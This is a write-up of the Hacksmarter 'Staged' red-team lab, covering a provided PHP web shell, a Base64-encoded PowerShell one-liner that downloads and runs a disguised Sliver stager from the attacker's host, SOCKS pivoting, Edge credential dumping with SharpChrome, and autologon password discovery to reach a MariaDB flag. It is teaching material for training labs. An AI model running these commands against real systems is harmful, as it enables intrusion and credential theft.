---
title: "Staged — Hacksmarter"
description: MEDIUM Difficulty
date: 2025-12-19 12:00:00 +0000
categories: [Writeups, Hacksmarter Labs]
tags: [Windows, Linux, AV Bypass, SQL Server, Sliver, Lateral, Chain]
image:
  path: /assets/staged_img/staged_banner.png
---

# Scope & Objective

You are a member of the **Hack Smarter Red Team** and have been assigned to perform a black-box penetration test against a client's critical infrastructure. The scope is strictly limited to the following hostnames:

- **web.hacksmarter:** Public-facing Windows Web Server (Initial Access Point). **Windows Defender is enabled.**
- **sqlsrv.hacksmarter:** Internal Linux MySQL Database Server.

The exercise is considered **complete** upon successfully retrieval the final flag from `sqlsrv.hacksmarter`

Any activity outside of these two hosts or their associated network interfaces is strictly prohibited.

### **Lab Starting Point**

During the beginning of the engagement, another operator exploited a file upload vulnerability, and they have provided you with a web shell.

`http://web.hacksmarter/hacksmarter/shell.php?cmd=whoami`

---

# Enumeration

Go ahead and add both targets to your **/etc/hosts** file

```bash
10.1.50.12  sqlsrv.hacksmarter
10.1.77.174 web.hacksmarter
```

## Nmap Scan

We’re going to run an nmap scan running NSE Scripts `-sC` as well as enumerate service versions with `-sV`

I always try to attempt to ping the target before running any other scans to validate connectivity, however, it seems ICMP is disabled for the target `web.hacksmarter`

Based on that notion, we will run a `-Pn` so that we treat the target host as online. 

```bash
nmap -sC -sV -Pn web.hacksmarter

PORT     STATE SERVICE       VERSION
80/tcp   open  http          Apache httpd 2.4.58 ((Win64) OpenSSL/3.1.3 PHP/8.0.30)
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30
| http-title: Welcome to XAMPP
|_Requested resource was http://web.hacksmarter/dashboard/
443/tcp  open  ssl/http      Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.0.30)
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
| http-title: Welcome to XAMPP
|_Requested resource was https://web.hacksmarter/dashboard/
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=EC2AMAZ-IBNMCK4
| Not valid before: 2025-09-09T01:57:20
|_Not valid after:  2026-03-11T01:57:20
| rdp-ntlm-info:
|   Target_Name: EC2AMAZ-IBNMCK4
|   NetBIOS_Domain_Name: EC2AMAZ-IBNMCK4
|   NetBIOS_Computer_Name: EC2AMAZ-IBNMCK4
|   DNS_Domain_Name: EC2AMAZ-IBNMCK4
|   DNS_Computer_Name: EC2AMAZ-IBNMCK4
|   Product_Version: 10.0.20348
|_  System_Time: 2025-12-19T15:26:08+00:00
|_ssl-date: 2025-12-19T15:26:13+00:00; -23s from scanner time.
5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: www.example.com; OS: Windows; CPE: cpe:/o:microsoft:windows
```

```bash
nmap -sC -sV -Pn sqlsrv.hacksmarter

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 60:61:a5:36:41:94:e9:aa:74:d2:bc:1f:c0:b0:31:4b (ECDSA)
|_  256 00:7b:ac:ba:9c:a4:d2:06:1f:ba:96:ab:ea:fb:7f:2e (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

---

# Starting Point (Initial Compromise)

So, another operator has granted us an initial foothold already, based on the initial scope and objective. 

our web shell:

```bash
http://web.hacksmarter/hacksmarter/shell.php?cmd=whoami
```

We can test to verify through curl:

```bash
┌──(root㉿BermudaDark)-[/home/cthulhu/hacksmarter/staged]
└─# curl http://web.hacksmarter/hacksmarter/shell.php?cmd=whoami
ec2amaz-ibnmck4\j.smith
```

It works, and we own the current user : `j.smith`

# Sliver C2 Session & AV Bypass

We know that windows defender is active. 

> **[!] Note on AV Evasion:** > To respect the intellectual property of the Hacksmarter platform & Founder (**Hack Smarter Sliver C2 Course)**, the specific compilation and obfuscation steps used to bypass Windows Defender have been omitted from this write-up.
> 
> 
> If you wish to learn the exact techniques for crafting undetectable payloads and bypassing modern AV, I highly recommend enrolling in the [**Sliver C2 AV Evasion Course**](https://www.google.com/search?q=https://www.hacksmarter.org/courses/sliver-c2).
> 

We have the custom stager and the sliver (shellcode) agent:

```bash
MsEdgeUpdate.exe
s.bin
```

I started an **mTLS listener** within Sliver on port 443 to receive the encrypted callback. 

```bash

sliver > mtls -L <kali-ip> -l 443

[*] Starting mTLS listener ...

[*] Successfully started job #1

sliver > jobs

 ID   Name   Protocol   Port   Stage Profile
==== ====== ========== ====== ===============
 1    mtls   tcp        443
```

I’ll also start up an http server so that we can transfer the two files over to the target machine.

```bash
python3 -m http.server 80
```

---

## Payload Delivery & Evasion Strategy

> By going with a custom staged approach, we can bypass defender’s **Static Analysis** since the binary does not match any known malicious signatures.  This allowed the file to sit on the disk in the `%TEMP%` directory without being flagged by the real-time protection engine.
We then bypassed **Dynamic/Behavioral Analysis** by executing our C2 agent directly in memory, ensuring the malicious code never touched the disk where it could be scanned by the 'On-Access' engine.
> 

**Execution via Web Shell**
To deliver our stager through the existing PHP web shell, we utilized a PowerShell one-liner. To ensure the command was not mangled by the web server’s URL handling, we converted the command to a Base64 encoded string using the following command:

```bash
echo -n 'IWR http://kali-ip/MsEdgeUpdate.exe -OutFile $env:TEMP\MsEdgeUpdate.exe; Start-Process $env:TEMP\MsEdgeUpdate.exe' | iconv -t utf16le | base64 -w 0
```

```bash
SQBXAFIAIABoAHQAdABwADoALwAvADEAMAAuADIAMAAwAC4AMgA0AC4AMQA0ADcALwBNAHMARQBkAGcAZQBVAHAAZABhAHQAZQAuAGUAeABlACAALQBPAHUAdABGAGkAbABlACAAJABlAG4AdgA6AFQARQBNAFAAXABNAHMARQBkAGcAZQBVAHAAZABhAHQAZQAuAGUAeABlADsAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAJABlAG4AdgA6AFQARQBNAFAAXABNAHMARQBkAGcAZQBVAHAAZABhAHQAZQAuAGUAeABlAA==
```

We can now pass the two files onto the target:

```bash
curl "http://web.hacksmarter/hacksmarter/shell.php?cmd=powershell.exe+-e+SQBXAFIAIABoAHQAdABwADoALwAvADEAMAAuADIAMAAwAC4AMgA0AC4AMQA0ADcALwBNAHMARQBkAGcAZQBVAHAAZABhAHQAZQAuAGUAeABlACAALQBPAHUAdABGAGkAbABlACAAJABlAG4AdgA6AFQARQBNAFAAXABNAHMARQBkAGcAZQBVAHAAZABhAHQAZQAuAGUAeABlADsAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAJABlAG4AdgA6AFQARQBNAFAAXABNAHMARQBkAGcAZQBVAHAAZABhAHQAZQAuAGUAeABlAA=="
```

And it works!!! We can verify that the files were passed and our sliver agent successfully executed. A new sliver session has been created for us as a result:

```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.1.77.174 - - [19/Dec/2025 18:40:25] "GET /MsEdgeUpdate.exe HTTP/1.1" 200 -
10.1.77.174 - - [19/Dec/2025 18:40:26] "GET /s.bin HTTP/1.1" 200 -
```

```bash
[*] Session 0f2a9c54 MIDDLE-CLASS_LEATHER - 10.1.77.174:49727 (EC2AMAZ-IBNMCK4) - windows/amd64 - Fri, 19 Dec 2025 18:40:27 EST

sliver > sessions -i 0f2a9c54

[*] Active session MIDDLE-CLASS_LEATHER (0f2a9c54)

sliver (MIDDLE-CLASS_LEATHER) > whoami

Logon ID: EC2AMAZ-IBNMCK4\j.smith
[*] Current Token ID: EC2AMAZ-IBNMCK4\j.smith
```

We now have a working session on `web.hacksmarter` and we ARE IN. However, we are still restricted in what we can do due to Windows Defender AND we are also low-level.

# Post Compromise

First thing i’m going to do is start a socks5 proxy. The second host is a sql server and chances are the port is 3306. We’re going to do a quick nmap scan to verify that the port is open and our initial machine is able to access it. 

```bash
sliver (MIDDLE-CLASS_LEATHER) > socks5 start

[*] Started SOCKS5 127.0.0.1 1081
⚠  In-band SOCKS proxies can be a little unstable depending on protocol
```

Make sure to add this to your `/etc/proxychains.conf` &/or `/etc/proxychains4.conf`:

```bash
socks5 127.0.0.1 1081
```

We can now verify if port 3306 is open, and do a quick version check:

```bash
proxychains4 nmap -Pn -sT -sV -p 3306 sqlsrv.hacksmarter
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-19 21:32 EST
[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.1.50.12:3306  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.1.50.12:3306  ...  OK
Nmap scan report for sqlsrv.hacksmarter (10.1.50.12)
Host is up (0.078s latency).

PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MariaDB 5.5.5-10.6.22

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.39 seconds
```

We are successful! We also find out the sql database type and version. 

## Post Enumeration

For post enumeration, I think it’s important to run a quick `info` on the sliver session. We can find out what OS version our windows target is rockin

```bash
sliver (MIDDLE-CLASS_LEATHER) > info

        Session ID: 0f2a9c54-b1d4-4abe-9f58-4abb2fa58f3f
              Name: MIDDLE-CLASS_LEATHER
          Hostname: EC2AMAZ-IBNMCK4
              UUID: ec24ca4e-d72c-f736-d84a-64731f020549
          Username: EC2AMAZ-IBNMCK4\j.smith
               UID: S-1-5-21-2241703281-3926990712-2237856116-1002
               GID: S-1-5-21-2241703281-3926990712-2237856116-513
               PID: 1616
                OS: windows
           Version: Server 2016 build 20348 x86_64
            Locale: en-US
              Arch: amd64
         Active C2: mtls://10.200.24.147:443
    Remote Address: 10.1.77.174:49727
         Proxy URL:
Reconnect Interval: 1m0s
     First Contact: Fri Dec 19 18:40:27 EST 2025 (49m24s ago)
      Last Checkin: Fri Dec 19 19:28:45 EST 2025 (1m6s ago)
```

We can also verify what privileges we currently have as well:

```bash
sliver (MIDDLE-CLASS_LEATHER) > getprivs

Privilege Information for MsEdgeUpdate.exe (PID: 1616)
------------------------------------------------------

Process Integrity Level: High

Name                          	Description                               	Attributes
====                          	===========                               	==========
SeChangeNotifyPrivilege       	Bypass traverse checking                  	Enabled, Enabled by Default
SeImpersonatePrivilege        	Impersonate a client after authentication 	Enabled, Enabled by Default
SeCreateGlobalPrivilege       	Create global objects                     	Enabled, Enabled by Default
SeIncreaseWorkingSetPrivilege 	Increase a process working set            	Disabled
```

This is big! We have `SeImpersonatePrivilege` enabled. We’re going to try different armories first, so we will keep this as a last resort. 

---

## CredDump : Sliver Armory `SharpChrome`

My current thought is to find out if there are any stored plaintext passwords on the system. Since our current machine’s host name is called `web.hacksmarter` and is hosting a webserver. It would’nt hurt to run an armory tool called `SharpChrome` to see if we could grab plaintext credentials from other users. 

I’ll first run a quick `chrome` check

```bash
sliver (MIDDLE-CLASS_LEATHER) > sharpchrome logins /browser:chrome

[*] sharpchrome output:

  __                 _
 (_  |_   _. ._ ._  /  |_  ._ _  ._ _   _
 __) | | (_| |  |_) \_ | | | (_) | | | (/_
                |
  v1.12.0

[*] Action: Chrome Saved Logins Triage

[*] Triaging Chrome Logins for current user

SharpChrome completed in 00:00:00.0160225
```

We get nothing here. We can try `Microsoft Edge`

```bash
sliver (MIDDLE-CLASS_LEATHER) > sharpchrome logins /browser:edge

[*] sharpchrome output:

  __                 _
 (_  |_   _. ._ ._  /  |_  ._ _  ._ _   _
 __) | | (_| |  |_) \_ | | | (_) | | | (/_
                |
  v1.12.0

[*] Action: Chrome Saved Logins Triage

[*] Triaging Chrome Logins for current user

[*] Action: Edge Saved Logins Triage
[*] Triaging Edge Logins for current user

[*] AES state key file : C:\Users\j.smith\AppData\Local\Microsoft\Edge\User Data\Local State
[*] AES state key      : [REDACTED]

--- Credential (Path: ...\User Data\Default\Login Data) ---

file_path,signon_realm,origin_url,date_created,times_used,username,password
...,https://hacksmarter.org/,https://hacksmarter.org/,[REDACTED],[REDACTED],b.morgan,O[REDACTED]
```

We get a hit!

```bash
b.morgan
0[redacted]15
```

---

## Attempting to login as `b.morgan` into the SQL Server

Unfortunately, the attempted login fails due to `b.morgan` having insufficient privileges. 

That means there’s either another set of creds stored on our current targeted system `web.hacksmarter` or we need to try and find a way to run a GodPotato attack to abuse our current user’s `SeImpersonate` privilege. 

I’m going to attempt to test out another armory tool on sliver, before attempting to try manually transfer/execute as well as bypass windows defender. 

## Local Privilege Escalation : Plaintext Discovery

After doing some research, I came across this armory tool

```bash
sharpup
```

`Sharpup` is a local privilege escalation (LPE) check tool. Instead of you manually checking every folder permission and registry key, SharpUp automates the search

We can run the `audit` flag to run checks and automat the inspection of service permissions, registry configurations, and path hijack opportunities. 

More importantly! An AUTOLOGON check!!

```bash
sliver (MIDDLE-CLASS_LEATHER) > sharpup audit

[*] sharpup output:

=== SharpUp: Running Privilege Escalation Checks ===
[!] Modifialbe scheduled tasks were not evaluated due to permissions.
[+] Hijackable DLL: C:\xampp\apache\bin\libhttpd.dll
[+] Associated Process is httpd with PID 4724
[+] Hijackable DLL: C:\xampp\apache\bin\libaprutil-1.dll
[+] Associated Process is httpd with PID 4724
[+] Hijackable DLL: C:\xampp\apache\bin\libapr-1.dll
[+] Associated Process is httpd with PID 4724
Registry AutoLogon Found

[+] Hijackable DLL: C:\xampp\apache\bin\pcre2-8.dll
[+] Associated Process is httpd with PID 4724
...
...
[+] Hijackable DLL: C:\xampp\php\ext\php_ftp.dll
[+] Associated Process is httpd with PID 3196

=== Registry AutoLogons ===
	DefaultDomainName:
	DefaultUserName: p.richardson
	DefaultPassword: ^[REDACTED]6
	AltDefaultDomainName:
	AltDefaultUserName:
	AltDefaultPassword:

=== Abusable Token Privileges ===
	SeImpersonatePrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED

=== Services with Unquoted Paths ===
	Service 'NoteTakingSvc' (StartMode: Automatic) has executable 'C:\Program Files\Note Taking App\notes.exe', but 'C:\Program' is modifable.

=== Modifiable Service Binaries ===
	Service 'Apache2.4' (State: Running, StartMode: Auto) : "C:\xampp\apache\bin\httpd.exe" -k runservice

[*] Completed Privesc Checks in 1 seconds
```

We find a set of credentials!

We can attempt to login to the sql server again using `p.richardson`'s creds.

# SQL Server Login as `p.richardson`

```bash
proxychains4 mysql -h sqlsrv.hacksmarter -u p.richardson -p '[REDACTED]' --skip-ssl
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.1.50.12:3306  ...  OK
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 37
Server version: 10.6.22-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Support MariaDB developers by giving a star at https://github.com/MariaDB/server
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]>
```

We’re in!!

# Machine PWN3D

We can enumerate databases and find the final flag here!

```bash
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| hacksmarter_db     |
| information_schema |
+--------------------+
2 rows in set (0.039 sec)

MariaDB [(none)]> use hacksmarter_db;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [hacksmarter_db]> show tables;
+--------------------------+
| Tables_in_hacksmarter_db |
+--------------------------+
| final_config             |
+--------------------------+
1 row in set (0.038 sec)

MariaDB [hacksmarter_db]> select * from final_config;
+----+-----------------+----------------------------------------+
| id | key_name        | key_value                              |
+----+-----------------+----------------------------------------+
|  1 | admin_api_token | FLAG{redacted} |
|  2 | system_status   | Operational                            |
+----+-----------------+----------------------------------------+
2 rows in set (0.038 sec)

MariaDB [hacksmarter_db]>
```
